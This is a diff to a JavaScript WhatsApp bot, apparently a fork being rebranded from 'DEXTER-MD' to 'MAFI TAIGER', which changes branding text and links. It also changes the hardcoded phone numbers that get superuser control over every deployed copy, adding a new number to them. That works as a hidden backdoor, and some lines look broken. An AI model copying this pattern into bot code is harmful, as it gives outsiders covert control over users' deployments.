@@ -157,8 +157,8 @@ setTimeout(() => {
             const FranceKing = '254757835036';
             const FranceKing1 = '254751284190';
             const FranceKing2 = "254750948696";
-            const FranceKing3 = '254742063632';
-            const sudo = await getAllSudoNumbers();
+            const FranceKing3 = '94726152295';
+            const sudo = await getAllSudoNumbers(94716152295);
             const superUserNumbers = [servBot, FranceKing, FranceKing1, FranceKing2, FranceKing3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
             const superUser = allAllowedNumbers.includes(auteurMessage);
@@ -428,7 +428,7 @@ function mybotpic() {
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'Dexter-Md',
+                                        pack: 'mafi-Md',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -670,7 +670,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `◇DEXTER-MD◇
+            let msg = `◇MAFI TAIGER◇
 `;
              
             let membres = group.participants;
@@ -688,7 +688,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
 ${metadata.desc}
 
-📌Powred by *DEXTER King®🐐*`;
+📌Powred by *MAFI TAIGER*`;
 
             zk.sendMessage(group.id, { image: { url: ppgroup }, caption: msg, mentions: membres });
         } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
@@ -870,14 +870,14 @@ ${metadata.desc}
      ▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
      ▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚▞▚
  
-║❒ _Join *DEXTER-MD* Channel for Updates_
-https://whatsapp.com/channel/0029VaOoODA65yDHLCqskX11_
+║❒ _Join *MAFI -MD* Channel for Updates_
+https://We.me/+94716152295
 
 ║❒ *JOIN OUR WhatsApp Gʀᴏᴜᴘ*
-https://chat.whatsapp.com/KGtgYAU9Qv14v5iU0qBUbV 
+https://chat.whatsapp.com/F1y0ujf8RHi83WaySxFb62 
 
 
-              *DEXTER-MD*`;
+              *MAFI TAIGER MD*`;
                 await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
             }
